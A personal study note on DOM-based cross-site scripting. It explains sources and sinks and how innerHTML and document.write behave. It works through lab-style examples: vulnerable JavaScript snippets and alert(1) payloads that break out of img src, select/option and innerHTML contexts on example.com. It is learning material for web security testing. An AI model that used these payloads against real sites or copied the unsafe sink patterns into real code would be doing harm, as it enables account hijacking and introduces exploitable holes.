# dom based

When JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

> source -> where the xss added

> sink -> where the xss consumed

> Key traits:

- No server involvement in execution
- Harder to detect with server-side tools
- Depends on frontend JS behavior

->

- The payload is handled entirely in the browser
- JavaScript reads from the URL and injects it into the page
- Execution happens because frontend JS mishandles it
- `location.search` and `location.hash` is a good start to search

---

```
<script>
  const name = location.hash.substring(1);
  document.getElementById("output").innerHTML = name;
</script>
```

->

`https://example.com/#<img src=x onerror=alert(1)>`

->

The script takes the hash and injects it directly into the DOM

## good to know

> many times the solution is where `location.search` source the data goes to the `document.write` sink

> document.write() injects content during HTML parsing, should execute script

> innerHTML injects content after parsing (DOM manipulation), should not execute script

## examples

#### a search result appears in an img src:

`https://www.example.com/?search=duck`

->

`<img src="/resources/images/tracker.gif?searchTerms=duck">`

- breaking out from the src:

`https://www.example.com/?search="><script>alert(1)</script>`

->

`"><script>alert(1)</script>`

---

#### storeId passes data to select>option

`https://www.example.com/product?productId=1`

- but in a script storeId data has been passed to an option:

```
var stores = ["London", "Paris", "Milan"];
var store = new URLSearchParams(window.location.search).get("storeId");

document.write('<select name="storeId">');

if (store) {
  document.write("<option selected>" + store + "</option>");
}

for (var i = 0; i < stores.length; i++) {
  if (stores[i] === store) {
    continue;
  }
  document.write("<option>" + stores[i] + "</option>");
}

document.write("</select>");
```

->

`https://www.example.com/product?productId=1&storeId=duck`

- it will add the duck to the options, lets break out

`https://www.example.com/product?productId=1&storeId=duck</option></select><script>alert(1)</script>`

- closing the option (and the select but that is ont necessary):

`&storeId=duck</option></select><script>alert(1)</script>`

---

#### innerHTML workaround:

search data injected by this script:

```
function doSearchQuery(query) {
  document.getElementById("searchMessage").innerHTML = query;
}

var query = new URLSearchParams(window.location.search).get("search");

if (query) {
  doSearchQuery(query);
}
```

- innerHTML injects content after parsing -> no execution

lets trigger an event instead

```
<img src="" onerror=alert(1) />
<img src="" onerror="alert(1)" />
<img src="" onerror="javascript:alert(1)" />
```

in the searchbar:

`duck<img src="" onerror=alert(1) />`

or in the url (better)

`https://www.example.com?search=duck<img src="" onerror=alert(1) />`

- the `onerror` will trigger because there are no `src` in the `<img>`

---
